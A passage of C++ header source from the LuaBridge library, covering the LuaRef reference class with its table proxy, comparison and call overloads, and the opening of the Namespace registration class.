inline int get_length (lua_State* L, int idx)
{
  lua_len (L, idx);
  int len = int (luaL_checknumber (L, -1));
  lua_pop (L, 1);
  return len;
}

#endif

#ifndef LUA_OK
# define LUABRIDGE_LUA_OK 0
#else
# define LUABRIDGE_LUA_OK LUA_OK
#endif

/** Get a table value, bypassing metamethods.
*/  
inline void rawgetfield (lua_State* L, int index, char const* key)
{
  assert (lua_istable (L, index));
  index = lua_absindex (L, index);
  lua_pushstring (L, key);
  lua_rawget (L, index);
}

/** Set a table value, bypassing metamethods.
*/  
inline void rawsetfield (lua_State* L, int index, char const* key)
{
  assert (lua_istable (L, index));
  index = lua_absindex (L, index);
  lua_pushstring (L, key);
  lua_insert (L, -2);
  lua_rawset (L, index);
}

/** Returns true if the value is a full userdata (not light).
*/
inline bool isfulluserdata (lua_State* L, int index)
{
  return lua_isuserdata (L, index) && !lua_islightuserdata (L, index);
}

/** Test lua_State objects for global equality.

    This can determine if two different lua_State objects really point
    to the same global state, such as when using coroutines.

    @note This is used for assertions.
*/
inline bool equalstates (lua_State* L1, lua_State* L2)
{
  return lua_topointer (L1, LUA_REGISTRYINDEX) ==
         lua_topointer (L2, LUA_REGISTRYINDEX);
}

```

`libs/LuaBridge/detail/LuaRef.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>
  Copyright 2008, Nigel Atkinson <suprapilot+LuaCode@gmail.com>

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

//------------------------------------------------------------------------------
/**
    Type tag for representing LUA_TNIL.

    Construct one of these using `Nil()` to represent a Lua nil. This is faster
    than creating a reference in the registry to nil. Example:

        LuaRef t (LuaRef::createTable (L));
        ...
        t ["k"] = Nil(); // assign nil
*/
struct Nil
{
};

//------------------------------------------------------------------------------
/**
    Lightweight reference to a Lua object.

    The reference is maintained for the lifetime of the C++ object.
*/
class LuaRef
{
private:
  class Proxy;
  friend struct Stack <Proxy>;

  //----------------------------------------------------------------------------
  /**
      Pop the Lua stack.

      Pops the specified number of stack items on destruction. We use this
      when returning objects, to avoid an explicit temporary variable, since
      the destructor executes after the return statement. For example:

          template <class U>
          U cast (lua_State* L)
          {
            StackPop p (L, 1);
            ...
            return U (); // dtor called after this line
          }

      @note The `StackPop` object must always be a named local variable.
  */
  class StackPop
  {
  public:
    /** Create a StackPop object.

        @param count The number of stack entries to pop on destruction.
    */
    StackPop (lua_State* L, int count)
      : m_L (L)
      , m_count (count)
    {
    }

    ~StackPop ()
    {
      lua_pop (m_L, m_count);
    }

  private:
    lua_State* m_L;
    int m_count;
  };

  //----------------------------------------------------------------------------
  /**
      A proxy for representing table values.
  */
  class Proxy
  {
  private:
    lua_State* m_L;
    int m_tableRef;
    int m_keyRef;

  public:
    //--------------------------------------------------------------------------
    /**
        Construct a Proxy from a table value.

        The table is in the registry, and the key is at the top of the stack.
        The key is popped off the stack.
    */
    Proxy (lua_State* L, int tableRef)
      : m_L (L)
      , m_tableRef (tableRef)
      , m_keyRef (luaL_ref (L, LUA_REGISTRYINDEX))
    {
    }

    //--------------------------------------------------------------------------
    /**
        Create a Proxy via copy constructor.

        It is best to avoid code paths that invoke this, because it creates
        an extra temporary Lua reference. Typically this is done by passing
        the Proxy parameter as a `const` reference.
    */
    Proxy (Proxy const& other)
      : m_L (other.m_L)
      , m_tableRef (other.m_tableRef)
    {
      // If this assert goes off it means code is taking this path,
      // which is better avoided.
      //
      assert (0);

      lua_rawgeti (m_L, LUA_REGISTRYINDEX, other.m_keyRef);
      m_keyRef = luaL_ref (m_L, LUA_REGISTRYINDEX);
    }

    //--------------------------------------------------------------------------
    /**
        Destroy the proxy.

        This does not destroy the table value.
    */
    ~Proxy ()
    {
      luaL_unref (m_L, LUA_REGISTRYINDEX, m_keyRef);
    }

    //--------------------------------------------------------------------------
    /**
        Return a reference to the table value.
    */
    int createRef () const
    {
      push (m_L);
      return luaL_ref (m_L, LUA_REGISTRYINDEX);
    }

    //--------------------------------------------------------------------------
    /**
        Assign a new value to this table key.

        This may invoke metamethods.
    */
    template <class T>
    Proxy& operator= (T v)
    {
      StackPop p (m_L, 1);
      lua_rawgeti (m_L, LUA_REGISTRYINDEX, m_tableRef);
      lua_rawgeti (m_L, LUA_REGISTRYINDEX, m_keyRef);
      Stack <T>::push (m_L, v);
      lua_rawset (m_L, -3);
      return *this;
    }

    //--------------------------------------------------------------------------
    /**
        Assign a new value to this table key.

        The assignment is raw, no metamethods are invoked.
    */
    template <class T>
    Proxy& rawset (T v)
    {
      StackPop p (m_L, 1);
      lua_rawgeti (m_L, LUA_REGISTRYINDEX, m_tableRef);
      lua_rawgeti (m_L, LUA_REGISTRYINDEX, m_keyRef);
      Stack <T>::push (m_L, v);
      lua_settable (m_L, -3);
      return *this;
    }

    //==========================================================================
    //
    // This group of member functions mirrors the member functions in LuaRef.

    /** Retrieve the lua_State associated with the table value.
    */
    lua_State* state () const
    {
      return m_L;
    }

    //--------------------------------------------------------------------------
    /**
        Push the value onto the Lua stack.
    */
    void push (lua_State* L) const
    {
      assert (equalstates (L, m_L));
      lua_rawgeti (L, LUA_REGISTRYINDEX, m_tableRef);
      lua_rawgeti (L, LUA_REGISTRYINDEX, m_keyRef);
      lua_gettable (L, -2);
      lua_remove (L, -2); // remove the table
    }

    //--------------------------------------------------------------------------
    /**
        Determine the object type.

        The return values are the same as for `lua_type`.
    */
    int type () const
    {
      int result;
      push (m_L);
      result = lua_type (m_L, -1);
      lua_pop (m_L, 1);
      return result;
    }

    inline bool isNil () const { return type () == LUA_TNIL; }
    inline bool isNumber () const { return type () == LUA_TNUMBER; }
    inline bool isString () const { return type () == LUA_TSTRING; }
    inline bool isTable () const { return type () == LUA_TTABLE; }
    inline bool isFunction () const { return type () == LUA_TFUNCTION; }
    inline bool isUserdata () const { return type () == LUA_TUSERDATA; }
    inline bool isThread () const { return type () == LUA_TTHREAD; }
    inline bool isLightUserdata () const { return type () == LUA_TLIGHTUSERDATA; }

    //--------------------------------------------------------------------------
    /**
        Perform an explicit conversion.
    */
    template <class T>
    T cast () const
    {
      StackPop p (m_L, 1);
      push (m_L);

      // lua_gettop is used because Userdata::getClass() doesn't handle
      // negative stack indexes.
      //
      return Stack <T>::get (m_L, lua_gettop (m_L));
    }

    //--------------------------------------------------------------------------
    /**
        Universal implicit conversion operator.

        NOTE: Visual Studio 2010 and 2012 have a bug where this function
              is not used. See:

        http://social.msdn.microsoft.com/Forums/en-US/vcgeneral/thread/e30b2664-a92d-445c-9db2-e8e0fbde2014
        https://connect.microsoft.com/VisualStudio/feedback/details/771509/correct-code-doesnt-compile

            // This code snippet fails to compile in vs2010,vs2012
            struct S {
              template <class T> inline operator T () const { return T (); }
            };
            int main () {
              S () || false;
              return 0;
            }
    */
    template <class T>
    inline operator T () const
    {
      return cast <T> ();
    }

    //--------------------------------------------------------------------------
    /**
        Universal comparison operators.
    */
    /** @{ */
    template <class T>
    bool operator== (T rhs) const
    {
      StackPop p (m_L, 2);
      push (m_L);
      Stack <T>::push (m_L, rhs);
      return lua_compare (m_L, -2, -1, LUA_OPEQ) == 1;
    }

    template <class T>
    bool operator< (T rhs) const
    {
      StackPop p (m_L, 2);
      push (m_L);
      Stack <T>::push (m_L, rhs);
      return lua_compare (m_L, -2, -1, LUA_OPLT) == 1;
    }

    template <class T>
    bool operator<= (T rhs) const
    {
      StackPop p (m_L, 2);
      push (m_L);
      Stack <T>::push (m_L, rhs);
      return lua_compare (m_L, -2, -1, LUA_OPLE) == 1;
    }

    template <class T>
    bool operator> (T rhs) const
    {
      StackPop p (m_L, 2);
      push (m_L);
      Stack <T>::push (m_L, rhs);
      return lua_compare (m_L, -1, -2, LUA_OPLT) == 1;
    }

    template <class T>
    bool operator>= (T rhs) const
    {
      StackPop p (m_L, 2);
      push (m_L);
      Stack <T>::push (m_L, rhs);
      return lua_compare (m_L, -1, -2, LUA_OPLE) == 1;
    }

    template <class T>
    bool rawequal (T rhs) const
    {
      StackPop p (m_L, 2);
      push (m_L);
      Stack <T>::push (m_L, rhs);
      return lua_rawequal (m_L, -1, -2) == 1;
    }
    /** @} */

    //--------------------------------------------------------------------------
    /**
        Access a table value using a key.

        This invokes metamethods.
    */
    template <class T>
    Proxy operator[] (T key) const
    {
      return LuaRef (*this) [key];
    }

    //--------------------------------------------------------------------------
    /**
        Access a table value using a key.

        The operation is raw, metamethods are not invoked. The result is
        passed by value and may not be modified.
    */
    template <class T>
    LuaRef rawget (T key) const
    {
      StackPop (m_L, 1);
      push (m_L);
      Stack <T>::push (m_L, key);
      lua_rawget (m_L, -2);
      return LuaRef (m_L, FromStack ());
    }

    //--------------------------------------------------------------------------
    /**
        Append a value to the table.

        If the table is a sequence this will add another element to it.
    */
    template <class T>
    void append (T v) const
    {
      push (m_L);
      Stack <T>::push (m_L, v);
      luaL_ref (m_L, -2);
      lua_pop (m_L, 1);
    }

    //--------------------------------------------------------------------------
    /**
        Call the length operator.

        This is identical to applying the Lua # operator.
    */
    int length () const
    {
      StackPop p (m_L, 1);
      push (m_L);
      return get_length (m_L, -1);
    }

    //--------------------------------------------------------------------------
    /**
        Call Lua code.

        These overloads allow Lua code to be called with up to 8 parameters.
        The return value is provided as a LuaRef (which may be LUA_REFNIL).
        If an error occurs, a LuaException is thrown.
    */
    /** @{ */
    LuaRef const operator() () const
    {
      push (m_L);
      LuaException::pcall (m_L, 0, 1);
      return LuaRef (m_L, FromStack ());
    }

    template <class P1>
    LuaRef const operator() (P1 p1) const
    {
      push (m_L);
      Stack <P1>::push (m_L, p1);
      LuaException::pcall (m_L, 1, 1);
      return LuaRef (m_L, FromStack ());
    }

    template <class P1, class P2>
    LuaRef const operator() (P1 p1, P2 p2) const
    {
      push (m_L);
      Stack <P1>::push (m_L, p1);
      Stack <P2>::push (m_L, p2);
      LuaException::pcall (m_L, 2, 1);
      return LuaRef (m_L, FromStack ());
    }

    template <class P1, class P2, class P3>
    LuaRef const operator() (P1 p1, P2 p2, P3 p3) const
    {
      push (m_L);
      Stack <P1>::push (m_L, p1);
      Stack <P2>::push (m_L, p2);
      Stack <P3>::push (m_L, p3);
      LuaException::pcall (m_L, 3, 1);
      return LuaRef (m_L, FromStack ());
    }

    template <class P1, class P2, class P3, class P4>
    LuaRef const operator() (P1 p1, P2 p2, P3 p3, P4 p4) const
    {
      push (m_L);
      Stack <P1>::push (m_L, p1);
      Stack <P2>::push (m_L, p2);
      Stack <P3>::push (m_L, p3);
      Stack <P4>::push (m_L, p4);
      LuaException::pcall (m_L, 4, 1);
      return LuaRef (m_L, FromStack ());
    }

    template <class P1, class P2, class P3, class P4, class P5>
    LuaRef const operator() (P1 p1, P2 p2, P3 p3, P4 p4, P5 p5) const
    {
      push (m_L);
      Stack <P1>::push (m_L, p1);
      Stack <P2>::push (m_L, p2);
      Stack <P3>::push (m_L, p3);
      Stack <P4>::push (m_L, p4);
      Stack <P5>::push (m_L, p5);
      LuaException::pcall (m_L, 5, 1);
      return LuaRef (m_L, FromStack ());
    }

    template <class P1, class P2, class P3, class P4, class P5, class P6>
    LuaRef const operator() (P1 p1, P2 p2, P3 p3, P4 p4, P5 p5, P6 p6) const
    {
      push (m_L);
      Stack <P1>::push (m_L, p1);
      Stack <P2>::push (m_L, p2);
      Stack <P3>::push (m_L, p3);
      Stack <P4>::push (m_L, p4);
      Stack <P5>::push (m_L, p5);
      Stack <P6>::push (m_L, p6);
      LuaException::pcall (m_L, 6, 1);
      return LuaRef (m_L, FromStack ());
    }

    template <class P1, class P2, class P3, class P4, class P5, class P6, class P7>
    LuaRef const operator() (P1 p1, P2 p2, P3 p3, P4 p4, P5 p5, P6 p6, P7 p7) const
    {
      push (m_L);
      Stack <P1>::push (m_L, p1);
      Stack <P2>::push (m_L, p2);
      Stack <P3>::push (m_L, p3);
      Stack <P4>::push (m_L, p4);
      Stack <P5>::push (m_L, p5);
      Stack <P6>::push (m_L, p6);
      Stack <P7>::push (m_L, p7);
      LuaException::pcall (m_L, 7, 1);
      return LuaRef (m_L, FromStack ());
    }

    template <class P1, class P2, class P3, class P4, class P5, class P6, class P7, class P8>
    LuaRef const operator() (P1 p1, P2 p2, P3 p3, P4 p4, P5 p5, P6 p6, P7 p7, P8 p8) const
    {
      push (m_L);
      Stack <P1>::push (m_L, p1);
      Stack <P2>::push (m_L, p2);
      Stack <P3>::push (m_L, p3);
      Stack <P4>::push (m_L, p4);
      Stack <P5>::push (m_L, p5);
      Stack <P6>::push (m_L, p6);
      Stack <P7>::push (m_L, p7);
      Stack <P8>::push (m_L, p8);
      LuaException::pcall (m_L, 8, 1);
      return LuaRef (m_L, FromStack ());
    }
    /** @} */

    //==========================================================================
  };

private:
  friend struct Stack <LuaRef>;

  //----------------------------------------------------------------------------
  /**
      Type tag for stack construction.
  */
  struct FromStack { };

  //----------------------------------------------------------------------------
  /**
      Create a reference to an object at the top of the Lua stack and pop it.

      This constructor is private and not invoked directly.
      Instead, use the `fromStack` function.

      @note The object is popped.
  */
  LuaRef (lua_State* L, FromStack)
    : m_L (L)
  {
    m_ref = luaL_ref (m_L, LUA_REGISTRYINDEX);
  }

  //----------------------------------------------------------------------------
  /**
      Create a reference to an object on the Lua stack.

      This constructor is private and not invoked directly.
      Instead, use the `fromStack` function.

      @note The object is not popped.
  */
  LuaRef (lua_State* L, int index, FromStack)
    : m_L (L)
  {
    lua_pushvalue (m_L, index);
    m_ref = luaL_ref (m_L, LUA_REGISTRYINDEX);
  }

  //----------------------------------------------------------------------------

  // This type of construction is disallowed, since we don't have a `lua_State`.
  //
  template <class T>
  LuaRef (T)
  {
  }

  //----------------------------------------------------------------------------
  /**
      Create a reference to this ref.

      This is used internally.
  */
  int createRef () const
  {
    if (m_ref != LUA_REFNIL)
    {
      push (m_L);
      return luaL_ref (m_L, LUA_REGISTRYINDEX);
    }
    else
    {
      return LUA_REFNIL;
    }
  }

public:
  //----------------------------------------------------------------------------
  /**
      Create a nil reference.

      The LuaRef may be assigned later.
  */
  LuaRef (lua_State* L)
    : m_L (L)
    , m_ref (LUA_REFNIL)
  {
  }

  //----------------------------------------------------------------------------
  /**
      Create a reference to a value.
  */
  template <class T>
  LuaRef (lua_State* L, T v)
    : m_L (L)
  {
    Stack <T>::push (m_L, v);
    m_ref = luaL_ref (m_L, LUA_REGISTRYINDEX);
  }

  //----------------------------------------------------------------------------
  /**
      Create a reference to a table value.
  */
  LuaRef (Proxy const& v)
    : m_L (v.state ())
    , m_ref (v.createRef ())
  {
  }

  //----------------------------------------------------------------------------
  /**
      Create a new reference to an existing reference.
  */
  LuaRef (LuaRef const& other)
    : m_L (other.m_L)
    , m_ref (other.createRef ())
  {
  }

  //----------------------------------------------------------------------------
  /**
      Destroy a reference.

      The corresponding Lua registry reference will be released.

      @note If the state refers to a thread, it is the responsibility of the
            caller to ensure that the thread still exists when the LuaRef
            is destroyed.
  */
  ~LuaRef ()
  {
    luaL_unref (m_L, LUA_REGISTRYINDEX, m_ref);
  }

  //----------------------------------------------------------------------------
  /**
      Return a LuaRef from a stack item.

      The stack item is not popped.
  */
  static LuaRef fromStack (lua_State* L, int index)
  {
    lua_pushvalue (L, index);
    return LuaRef (L, FromStack ());
  }

  //----------------------------------------------------------------------------
  /**
      Create a new empty table and return a reference to it.

      It is also possible to use the free function `newTable`.

      @see ::getGlobal
  */
  static LuaRef newTable (lua_State* L)
  {
    lua_newtable (L);
    return LuaRef (L, FromStack ());
  }

  //----------------------------------------------------------------------------
  /**
      Return a reference to a named global.

      It is also possible to use the free function `getGlobal`.

      @see ::getGlobal
  */
  static LuaRef getGlobal (lua_State *L, char const* name)
  {
    lua_getglobal (L, name);
    return LuaRef (L, FromStack ());
  }

  //----------------------------------------------------------------------------
  /**
      Assign a different value to this LuaRef.
  */
  template <class T>
  LuaRef& operator= (T rhs)
  {
    luaL_unref (m_L, LUA_REGISTRYINDEX, m_ref);
    Stack <T>::push (m_L, rhs);
    m_ref = luaL_ref (m_L, LUA_REGISTRYINDEX);
    return *this;
  }

  //----------------------------------------------------------------------------
  /**
      Assign another LuaRef to this LuaRef.
  */
  LuaRef& operator= (LuaRef const& rhs)
  {
    luaL_unref (m_L, LUA_REGISTRYINDEX, m_ref);
    rhs.push (m_L);
    m_L = rhs.state ();
    m_ref = luaL_ref (m_L, LUA_REGISTRYINDEX);
    return *this;
  }

  //----------------------------------------------------------------------------
  /**
      converts to a string using luas tostring function
  */
  std::string tostring() const
  {
    lua_getglobal (m_L, "tostring");
    push (m_L);
    lua_call (m_L, 1, 1);
    const char* str = lua_tostring(m_L, 1);
    lua_pop(m_L, 1);
    return std::string(str);
  }

  //----------------------------------------------------------------------------
  /**
      Print a text description of the value to a stream.

      This is used for diagnostics.
  */
  void print (std::ostream& os) const
  {
    switch (type ())
    {
    case LUA_TNIL:
      os << "nil";
      break;

    case LUA_TNUMBER:
      os << cast <lua_Number> ();
      break;

    case LUA_TBOOLEAN:
      os << (cast <bool> () ? "true" : "false");
      break;

    case LUA_TSTRING:
      os << '"' << cast <std::string> () << '"';
      break;

    case LUA_TTABLE:
      os << "table: " << tostring();
      break;

    case LUA_TFUNCTION:
      os << "function: " << tostring();
      break;

    case LUA_TUSERDATA:
      os << "userdata: " << tostring();
      break;

    case LUA_TTHREAD:
      os << "thread: " << tostring();
      break;

    case LUA_TLIGHTUSERDATA:
      os << "lightuserdata: " << tostring();
      break;

    default:
      os << "unknown";
      break;
    }
  }

  //============================================================================
  //
  // This group of member functions is mirrored in Proxy
  //

  /** Retrieve the lua_State associated with the reference.
  */
  lua_State* state () const
  {
    return m_L;
  }

  //----------------------------------------------------------------------------
  /**
      Place the object onto the Lua stack.
  */
  void push (lua_State* L) const
  {
    assert (equalstates (L, m_L));
    lua_rawgeti (L, LUA_REGISTRYINDEX, m_ref);
  }

  //----------------------------------------------------------------------------
  /**
      Pop the top of Lua stack and assign the ref to m_ref
  */
  void pop (lua_State* L)
  {
    assert (equalstates (L, m_L));
    luaL_unref (m_L, LUA_REGISTRYINDEX, m_ref);
    m_ref = luaL_ref (m_L, LUA_REGISTRYINDEX);
  }

  //----------------------------------------------------------------------------
  /**
      Determine the object type.

      The return values are the same as for `lua_type`.
  */
  /** @{ */
  int type () const
  {
    int result;
    if (m_ref != LUA_REFNIL)
    {
      push (m_L);
      result = lua_type (m_L, -1);
      lua_pop (m_L, 1);
    }
    else
    {
      result = LUA_TNIL;
    }

    return result;
  }

  // should never happen
  //inline bool isNone () const { return m_ref == LUA_NOREF; }

  inline bool isNil () const { return type () == LUA_TNIL; }
  inline bool isNumber () const { return type () == LUA_TNUMBER; }
  inline bool isString () const { return type () == LUA_TSTRING; }
  inline bool isTable () const { return type () == LUA_TTABLE; }
  inline bool isFunction () const { return type () == LUA_TFUNCTION; }
  inline bool isUserdata () const { return type () == LUA_TUSERDATA; }
  inline bool isThread () const { return type () == LUA_TTHREAD; }
  inline bool isLightUserdata () const { return type () == LUA_TLIGHTUSERDATA; }
  /** @} */

  //----------------------------------------------------------------------------
  /**
      Perform an explicit conversion.
  */
  template <class T>
  T cast () const
  {
    StackPop p (m_L, 1);
    push (m_L);

    // lua_gettop is used because Userdata::getClass() doesn't handle
    // negative stack indexes.
    //
    return Stack <T>::get (m_L, lua_gettop (m_L));
  }

  //----------------------------------------------------------------------------
  /**
      Universal implicit conversion operator.

      NOTE: Visual Studio 2010 and 2012 have a bug where this function
            is not used. See:

      http://social.msdn.microsoft.com/Forums/en-US/vcgeneral/thread/e30b2664-a92d-445c-9db2-e8e0fbde2014
      https://connect.microsoft.com/VisualStudio/feedback/details/771509/correct-code-doesnt-compile

          // This code snippet fails to compile in vs2010,vs2012
          struct S {
            template <class T> inline operator T () const { return T (); }
          };
          int main () {
            S () || false;
            return 0;
          }
  */
  template <class T>
  inline operator T () const
  {
    return cast <T> ();
  }

  //----------------------------------------------------------------------------
  /**
      Universal comparison operators.
  */
  /** @{ */
  template <class T>
  bool operator== (T rhs) const
  {
    StackPop p (m_L, 2);
    push (m_L);
    Stack <T>::push (m_L, rhs);
    return lua_compare (m_L, -2, -1, LUA_OPEQ) == 1;
  }

  template <class T>
  bool operator< (T rhs) const
  {
    StackPop p (m_L, 2);
    push (m_L);
    Stack <T>::push (m_L, rhs);
    return lua_compare (m_L, -2, -1, LUA_OPLT) == 1;
  }

  template <class T>
  bool operator<= (T rhs) const
  {
    StackPop p (m_L, 2);
    push (m_L);
    Stack <T>::push (m_L, rhs);
    return lua_compare (m_L, -2, -1, LUA_OPLE) == 1;
  }

  template <class T>
  bool operator> (T rhs) const
  {
    StackPop p (m_L, 2);
    push (m_L);
    Stack <T>::push (m_L, rhs);
    return lua_compare (m_L, -1, -2, LUA_OPLT) == 1;
  }

  template <class T>
  bool operator>= (T rhs) const
  {
    StackPop p (m_L, 2);
    push (m_L);
    Stack <T>::push (m_L, rhs);
    return lua_compare (m_L, -1, -2, LUA_OPLE) == 1;
  }

  template <class T>
  bool rawequal (T rhs) const
  {
    StackPop p (m_L, 2);
    push (m_L);
    Stack <T>::push (m_L, rhs);
    return lua_rawequal (m_L, -1, -2) == 1;
  }
  /** @} */

  //----------------------------------------------------------------------------
  /**
      Append a value to the table.

      If the table is a sequence this will add another element to it.
  */
  template <class T>
  void append (T v) const
  {
    push (m_L);
    Stack <T>::push (m_L, v);
    luaL_ref (m_L, -2);
    lua_pop (m_L, 1);
  }

  //----------------------------------------------------------------------------
  /**
      Call the length operator.

      This is identical to applying the Lua # operator.
  */
  int length () const
  {
    StackPop p (m_L, 1);
    push (m_L);
    return get_length (m_L, -1);
  }

  //----------------------------------------------------------------------------
  /**
      Access a table value using a key.

      This invokes metamethods.
  */
  template <class T>
  Proxy operator[] (T key) const
  {
    Stack <T>::push (m_L, key);
    return Proxy (m_L, m_ref);
  }

  //----------------------------------------------------------------------------
  /**
      Call Lua code.

      These overloads allow Lua code to be called with up to 8 parameters.
      The return value is provided as a LuaRef (which may be LUA_REFNIL).
      If an error occurs, a LuaException is thrown.
  */
  /** @{ */
  LuaRef const operator() () const
  {
    push (m_L);
    LuaException::pcall (m_L, 0, 1);
    return LuaRef (m_L, FromStack ());
  }

  template <class P1>
  LuaRef const operator() (P1 p1) const
  {
    push (m_L);
    Stack <P1>::push (m_L, p1);
    LuaException::pcall (m_L, 1, 1);
    return LuaRef (m_L, FromStack ());
  }

  template <class P1, class P2>
  LuaRef const operator() (P1 p1, P2 p2) const
  {
    push (m_L);
    Stack <P1>::push (m_L, p1);
    Stack <P2>::push (m_L, p2);
    LuaException::pcall (m_L, 2, 1);
    return LuaRef (m_L, FromStack ());
  }

  template <class P1, class P2, class P3>
  LuaRef const operator() (P1 p1, P2 p2, P3 p3) const
  {
    push (m_L);
    Stack <P1>::push (m_L, p1);
    Stack <P2>::push (m_L, p2);
    Stack <P3>::push (m_L, p3);
    LuaException::pcall (m_L, 3, 1);
    return LuaRef (m_L, FromStack ());
  }

  template <class P1, class P2, class P3, class P4>
  LuaRef const operator() (P1 p1, P2 p2, P3 p3, P4 p4) const
  {
    push (m_L);
    Stack <P1>::push (m_L, p1);
    Stack <P2>::push (m_L, p2);
    Stack <P3>::push (m_L, p3);
    Stack <P4>::push (m_L, p4);
    LuaException::pcall (m_L, 4, 1);
    return LuaRef (m_L, FromStack ());
  }

  template <class P1, class P2, class P3, class P4, class P5>
  LuaRef const operator() (P1 p1, P2 p2, P3 p3, P4 p4, P5 p5) const
  {
    push (m_L);
    Stack <P1>::push (m_L, p1);
    Stack <P2>::push (m_L, p2);
    Stack <P3>::push (m_L, p3);
    Stack <P4>::push (m_L, p4);
    Stack <P5>::push (m_L, p5);
    LuaException::pcall (m_L, 5, 1);
    return LuaRef (m_L, FromStack ());
  }

  template <class P1, class P2, class P3, class P4, class P5, class P6>
  LuaRef const operator() (P1 p1, P2 p2, P3 p3, P4 p4, P5 p5, P6 p6) const
  {
    push (m_L);
    Stack <P1>::push (m_L, p1);
    Stack <P2>::push (m_L, p2);
    Stack <P3>::push (m_L, p3);
    Stack <P4>::push (m_L, p4);
    Stack <P5>::push (m_L, p5);
    Stack <P6>::push (m_L, p6);
    LuaException::pcall (m_L, 6, 1);
    return LuaRef (m_L, FromStack ());
  }

  template <class P1, class P2, class P3, class P4, class P5, class P6, class P7>
  LuaRef const operator() (P1 p1, P2 p2, P3 p3, P4 p4, P5 p5, P6 p6, P7 p7) const
  {
    push (m_L);
    Stack <P1>::push (m_L, p1);
    Stack <P2>::push (m_L, p2);
    Stack <P3>::push (m_L, p3);
    Stack <P4>::push (m_L, p4);
    Stack <P5>::push (m_L, p5);
    Stack <P6>::push (m_L, p6);
    Stack <P7>::push (m_L, p7);
    LuaException::pcall (m_L, 7, 1);
    return LuaRef (m_L, FromStack ());
  }

  template <class P1, class P2, class P3, class P4, class P5, class P6, class P7, class P8>
  LuaRef const operator() (P1 p1, P2 p2, P3 p3, P4 p4, P5 p5, P6 p6, P7 p7, P8 p8) const
  {
    push (m_L);
    Stack <P1>::push (m_L, p1);
    Stack <P2>::push (m_L, p2);
    Stack <P3>::push (m_L, p3);
    Stack <P4>::push (m_L, p4);
    Stack <P5>::push (m_L, p5);
    Stack <P6>::push (m_L, p6);
    Stack <P7>::push (m_L, p7);
    Stack <P8>::push (m_L, p8);
    LuaException::pcall (m_L, 8, 1);
    return LuaRef (m_L, FromStack ());
  }
  /** @} */

  //============================================================================

private:
  lua_State* m_L;
  int m_ref;
};

//------------------------------------------------------------------------------
/**
    Stack specialization for Nil
*/
template <>
struct Stack <Nil>
{
public:
  static inline void push (lua_State* L, Nil)
  {
    lua_pushnil (L);
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for LuaRef.
*/
template <>
struct Stack <LuaRef>
{
public:
  // The value is const& to prevent a copy construction.
  //
  static inline void push (lua_State* L, LuaRef const& v)
  {
    v.push (L);
  }

  static inline LuaRef get (lua_State* L, int index)
  {
    return LuaRef (L, index, LuaRef::FromStack ());
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for Proxy.
*/
template <>
struct Stack <LuaRef::Proxy>
{
public:
  // The value is const& to prevent a copy construction.
  //
  static inline void push (lua_State* L, LuaRef::Proxy const& v)
  {
    v.push (L);
  }
};

//------------------------------------------------------------------------------
/**
    Create a reference to a new, empty table.

    This is a syntactic abbreviation for LuaRef::newTable().
*/
inline LuaRef newTable (lua_State* L)
{
  return LuaRef::newTable (L);
}

//------------------------------------------------------------------------------
/**
    Create a reference to a value in the global table.

    This is a syntactic abbreviation for LuaRef::getGlobal().
*/
inline LuaRef getGlobal (lua_State *L, char const* name)
{
  return LuaRef::getGlobal (L, name);
}

//------------------------------------------------------------------------------
/**
    Write a LuaRef to a stream.

    This allows LuaRef and table proxies to work with streams.
*/
inline std::ostream& operator<< (std::ostream& os, LuaRef const& ref)
{
  ref.print (os);
  return os;
}

//------------------------------------------------------------------------------

// more C++-like cast syntax
//
template<class T>
inline T LuaRef_cast(LuaRef const& lr)
{
  return lr.cast<T>();
}

```

`libs/LuaBridge/detail/Namespace.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>
  Copyright 2007, Nathan Reed

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

/** Provides C++ to Lua registration capabilities.

    This class is not instantiated directly, call `getGlobalNamespace` to start
    the registration process.
*/
class Namespace
{
private:
  Namespace& operator= (Namespace const& other);

  lua_State* const L;
  int mutable m_stackSize;

private:
  //============================================================================
  /**
    Error reporting.

    VF: This function looks handy, why aren't we using it?
  */
#if 0
  static int luaError (lua_State* L, std::string message)
  {
